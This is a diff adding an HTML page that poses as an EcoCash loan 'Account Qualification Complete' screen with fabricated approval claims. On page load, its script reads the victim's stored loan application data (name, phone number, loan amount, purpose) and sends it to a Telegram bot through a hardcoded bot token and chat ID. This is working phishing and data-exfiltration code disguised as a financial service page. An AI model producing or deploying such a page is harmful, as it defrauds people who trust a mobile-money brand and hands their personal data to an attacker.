@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash - Account Qualification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        
+        .logo {
+            font-size: 32px;
+            color: #667eea;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 28px;
+        }
+        
+        .qualification-message {
+            background: #f0f3ff;
+            padding: 25px;
+            border-radius: 15px;
+            margin: 30px 0;
+            text-align: left;
+        }
+        
+        .qualification-message h3 {
+            color: #667eea;
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+        
+        .qualification-message ul {
+            list-style: none;
+            padding-left: 0;
+        }
+        
+        .qualification-message li {
+            margin-bottom: 10px;
+            padding-left: 25px;
+            position: relative;
+            color: #555;
+        }
+        
+        .qualification-message li:before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: #10b981;
+            font-weight: bold;
+        }
+        
+        .account-details {
+            background: #f9f9f9;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        .account-details h3 {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+        
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .detail-label {
+            color: #666;
+            font-weight: bold;
+        }
+        
+        .detail-value {
+            color: #333;
+            font-weight: 500;
+        }
+        
+        .btn-action {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 18px;
+            font-size: 18px;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+            transition: transform 0.3s;
+            margin-top: 20px;
+        }
+        
+        .btn-action:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+        }
+        
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #999;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">EcoCash</div>
+        <h1>Account Qualification Complete</h1>
+        
+        <div class="qualification-message">
+            <h3>Congratulations! Your account is fully qualified</h3>
+            <ul>
+                <li>Identity verification completed</li>
+                <li>Phone number verified</li>
+                <li>Credit check passed</li>
+                <li>Account approved for lending</li>
+                <li>Loan application under review</li>
+            </ul>
+        </div>
+        
+        <div class="account-details">
+            <h3>Account Summary</h3>
+            <div class="detail-row">
+                <span class="detail-label">Account Status:</span>
+                <span class="detail-value" style="color: #10b981; font-weight: bold;">ACTIVE</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Verification Level:</span>
+                <span class="detail-value">Level 3 (Full)</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Loan Limit:</span>
+                <span class="detail-value">$10,000</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Application Status:</span>
+                <span class="detail-value" id="appStatus">Under Review</span>
+            </div>
+        </div>
+        
+        <button class="btn-action" onclick="goToDashboard()">
+            GO TO ECOCASH DASHBOARD
+        </button>
+        
+        <div class="footer">
+            <p>Your EcoCash wallet is now fully operational with all features unlocked</p>
+            <p style="margin-top: 10px;">© 2025 EcoCash. All rights reserved.</p>
+        </div>
+    </div>
+
+    <script>
+        // Get application data
+        const applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+        
+        // Update application status if needed
+        document.addEventListener('DOMContentLoaded', function() {
+            if (applicationData.applicationId) {
+                // Send qualification success to Telegram
+                sendQualificationSuccess();
+            }
+        });
+        
+        function sendQualificationSuccess() {
+            const botToken = '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI';
+            const chatId = '5520957080';
+            
+            const message = `
+🎉 *ACCOUNT FULLY QUALIFIED*
+
+✅ *Qualification Complete*
+📋 *Application ID:* ${applicationData.applicationId || 'N/A'}
+👤 *Account Holder:* ${applicationData.firstName || 'N/A'} ${applicationData.lastName || 'N/A'}
+📱 *Phone:* +263${applicationData.phone || 'N/A'}
+✅ *Status:* Fully Verified & Qualified
+
+💰 *Loan Application Status:*
+• Amount: $${applicationData.loanAmount?.toLocaleString() || 'N/A'}
+• Term: ${applicationData.loanTerm || 'N/A'} months
+• Purpose: ${applicationData.purpose || 'N/A'}
+• Status: Under Final Review
+
+🏦 *Account Limits Activated:*
+• Max Loan Limit: $10,000
+• Withdrawal Limit: $5,000/day
+• Transfer Limit: $2,000/day
+
+🕒 *Qualified at:* ${new Date().toLocaleString()}
+            `;
+            
+            const encodedMessage = encodeURIComponent(message);
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}&parse_mode=Markdown`)
+                .catch(error => console.error('Error:', error));
+        }
+        
+        function goToDashboard() {
+            // Redirect to a dashboard or completion page
+            alert('Redirecting to EcoCash Dashboard...');
+            // window.location.href = 'dashboard.html';
+        }
+    </script>
+</body>
+</html>
